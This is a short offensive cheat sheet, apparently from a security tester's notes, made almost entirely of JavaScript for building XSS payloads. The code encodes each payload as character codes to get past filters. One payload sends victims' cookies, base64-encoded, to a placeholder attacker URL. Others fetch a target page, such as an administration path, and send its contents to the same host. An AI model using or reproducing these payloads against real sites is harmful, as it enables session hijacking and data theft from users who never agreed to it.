
XSS cookie stealing using char code bypass:
---
#xss #charcode #bypass #cookies 
```js
const attacker = `http://$ATTACKER_URL/cb`;
const xssString = `var attacker = "${attacker}";
fetch(attacker + "?cb=" + encodeURI(btoa(document.cookie)));`
//const payload = Array.from(xssString.split(''), ch => ch.charCodeAt(0)).join(',');
const payload = xssString.split('').map(ch => ch.charCodeAt(0)).join(',');
console.log(payload);
```
Reverse the payload:
---
```js
console.log(String.fromCharCode(...(payload.split(','))));
```

Fetch a page using XSS
---
```javascript
var url = "$TARGET_URL";
var attacker = "$ATTACKER_URL";
const xssString = `
var xhr  = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
        fetch("${attacker}" + "?" + encodeURI(btoa(xhr.responseText)))
    }
}
xhr.open('GET', "${url}", true);
xhr.send(null);`
const payload = xssString.split('').map(ch => ch.charCodeAt(0)).join(',');
```

```js
var url = "http://$TARGET_URL$:3000/administration";
var attacker = "http://$ATTACKER_URL/cb";
const xssString = `
var xhr  = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
        fetch("${attacker}" + "?" + encodeURI(btoa(xhr.responseText)))
    }
}
xhr.open('GET', "${url}", true);
xhr.send(null);`
const payload = Array.from(xssString.split(''), ch => ch.charCodeAt(0)).join(',');
```
